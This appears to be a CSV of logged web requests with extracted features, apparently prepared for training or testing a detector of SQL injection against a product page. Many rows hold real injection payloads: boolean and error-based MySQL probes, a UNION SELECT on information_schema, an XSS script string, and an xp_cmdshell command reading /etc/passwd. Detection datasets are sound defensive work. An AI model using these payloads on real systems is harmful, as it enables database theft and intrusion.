full_url,parsed_url,event_time,hostname,sql_keyword,params_length,request_volume,special_chars,value_to_length
/details.php?pr	od=5&type=2,/details.php?pr	od=5&type=2,1680093070.911037,10.0.2.32,0,2,0.1,0,0.0
/details.php?pr	od=5&type=2,/details.php?pr	od=5&type=2,1680093070.911037,10.0.2.31,0,2,4.2,0,0.0
/details.php?prod=5&type=2&OUOT=7916%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,"/details.php?prod=5&type=2&OUOT=7916 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(""XSS"")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#",1680093072.451418,10.0.2.31,8,178,4.2,7,8.426966292134832
/details.php?prod=5&type=2,/details.php?prod=5&type=2,1680093072.500793,10.0.2.31,0,2,4.2,0,0.0
/details.php?prod=3196&type=2,/details.php?prod=3196&type=2,1680093072.547299,10.0.2.31,0,5,4.2,0,0.0
/details.php?prod=5.%28%2C%2C%2C%27%28%22%28%2C&type=2,"/details.php?prod=5.(,,,'(""(,&type=2",1680093072.579581,10.0.2.31,0,13,4.2,2,15.384615384615385
/details.php?prod=5%27DGsZuv%3C%27%22%3EvASviJ&type=2,"/details.php?prod=5'DGsZuv<'"">vASviJ&type=2",1680093072.596299,10.0.2.31,1,21,4.2,2,14.285714285714286
/details.php?prod=5%29%20AND%202119%3D1319%20AND%20%286016%3D6016&type=2,/details.php?prod=5) AND 2119=1319 AND (6016=6016&type=2,1680093074.578803,10.0.2.31,1,32,4.2,0,3.125
/details.php?prod=5%29%20AND%202242%3D2242%20AND%20%287595%3D7595&type=2,/details.php?prod=5) AND 2242=2242 AND (7595=7595&type=2,1680093074.604683,10.0.2.31,1,32,4.2,0,3.125
/details.php?prod=5%29%29%20AND%209477%3D1460%20AND%20%28%284897%3D4897&type=2,/details.php?prod=5)) AND 9477=1460 AND ((4897=4897&type=2,1680093074.62256,10.0.2.31,1,34,4.2,0,2.9411764705882355
/details.php?prod=5%29%29%20AND%202242%3D2242%20AND%20%28%287188%3D7188&type=2,/details.php?prod=5)) AND 2242=2242 AND ((7188=7188&type=2,1680093074.64507,10.0.2.31,1,34,4.2,0,2.9411764705882355
/details.php?prod=5%20AND%209513%3D5835&type=2,/details.php?prod=5 AND 9513=5835&type=2,1680093074.649396,10.0.2.31,1,16,4.2,0,6.25
/details.php?prod=5%20AND%202242%3D2242&type=2,/details.php?prod=5 AND 2242=2242&type=2,1680093074.653963,10.0.2.31,1,16,4.2,0,6.25
/details.php?prod=5%20AND%207784%3D5336&type=2,/details.php?prod=5 AND 7784=5336&type=2,1680093074.658885,10.0.2.31,1,16,4.2,0,6.25
/details.php?prod=%28SELECT%20CONCAT%28CONCAT%280x7176787171%2C%28CASE%20WHEN%20%283069%3D3069%29%20THEN%200x31%20ELSE%200x30%20END%29%29%2C0x7178706a71%29%29&type=2,"/details.php?prod=(SELECT CONCAT(CONCAT(0x7176787171,(CASE WHEN (3069=3069) THEN 0x31 ELSE 0x30 END)),0x7178706a71))&type=2",1680093074.664277,10.0.2.31,3,99,4.2,0,3.0303030303030303
/details.php?prod=5%20AND%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%284026%3D4026%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29&type=2,"/details.php?prod=5 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(4026=4026,1))),0x7178706a71,0x78))s), 8446744073709551610, 8446744073709551610)))&type=2",1680093074.678264,10.0.2.31,3,158,4.2,0,1.8987341772151898
/details.php?prod=5%20OR%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285302%3D5302%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29&type=2,"/details.php?prod=5 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(5302=5302,1))),0x7178706a71,0x78))s), 8446744073709551610, 8446744073709551610)))&type=2",1680093074.694063,10.0.2.31,3,157,4.2,0,1.910828025477707
/details.php?prod=5%20AND%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%289946%3D9946%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29&type=2,"/details.php?prod=5 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(9946=9946,1))),0x7178706a71,0x78))x))&type=2",1680093074.699487,10.0.2.31,3,105,4.2,0,2.857142857142857
/details.php?prod=5%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%284491%3D4491%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29&type=2,"/details.php?prod=5 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176787171,(SELECT (ELT(4491=4491,1))),0x7178706a71,0x78))x))&type=2",1680093074.707818,10.0.2.31,3,104,4.2,0,2.8846153846153846
/details.php?prod=5%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%283395%3D3395%2C1%29%29%29%2C0x7178706a71%29%2C3395%29&type=2,"/details.php?prod=5 AND GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(3395=3395,1))),0x7178706a71),3395)&type=2",1680093074.721746,10.0.2.31,3,86,4.2,0,3.488372093023256
/details.php?prod=5%20OR%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%288719%3D8719%2C1%29%29%29%2C0x7178706a71%29%2C8719%29&type=2,"/details.php?prod=5 OR GTID_SUBSET(CONCAT(0x7176787171,(SELECT (ELT(8719=8719,1))),0x7178706a71),8719)&type=2",1680093074.729914,10.0.2.31,3,85,4.2,0,3.5294117647058822
/details.php?prod=5%20AND%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285653%3D5653%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29&type=2,"/details.php?prod=5 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7176787171,(SELECT (ELT(5653=5653,1))),0x7178706a71)) USING utf8)))&type=2",1680093074.734531,10.0.2.31,3,117,4.2,0,2.5641025641025643
/details.php?prod=5%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%288934%3D8934%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29&type=2,"/details.php?prod=5 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7176787171,(SELECT (ELT(8934=8934,1))),0x7178706a71)) USING utf8)))&type=2",1680093074.748218,10.0.2.31,3,116,4.2,0,2.586206896551724
/details.php?prod=5%20AND%20%28SELECT%201102%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281102%3D1102%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29&type=2,"/details.php?prod=5 AND (SELECT 1102 FROM(SELECT COUNT(*),CONCAT(0x7176787171,(SELECT (ELT(1102=1102,1))),0x7178706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&type=2",1680093074.754324,10.0.2.31,6,166,4.2,0,3.6144578313253013
/details.php?prod=%28SELECT%20CONCAT%280x7176787171%2C%28ELT%282387%3D2387%2C1%29%29%2C0x7178706a71%29%29&type=2,"/details.php?prod=(SELECT CONCAT(0x7176787171,(ELT(2387=2387,1)),0x7178706a71))&type=2",1680093074.76742,10.0.2.31,1,62,4.2,0,1.6129032258064515
/details.php?prod=5&type=2,/details.php?prod=5&type=2,1680093074.782894,10.0.2.31,0,2,4.2,0,0.0
/details.php?prod=5&type=2,/details.php?prod=5&type=2,1680093074.793082,10.0.2.31,0,2,4.2,0,0.0
/details.php?prod=5&type=2,/details.php?prod=5&type=2,1680093074.796677,10.0.2.31,0,2,4.2,0,0.0
/details.php?prod=5&type=2,/details.php?prod=5&type=2,1680093074.801924,10.0.2.31,0,2,4.2,0,0.0
/details.php?prod=5&type=2,/details.php?prod=5&type=2,1680093074.807654,10.0.2.31,0,2,4.2,0,0.0
/details.php?prod=5&type=2,/details.php?prod=5&type=2,1680093074.812276,10.0.2.31,0,2,4.2,0,0.0
/details.php?prod=5&type=2,/details.php?prod=5&type=2,1680093074.815916,10.0.2.31,0,2,4.2,0,0.0
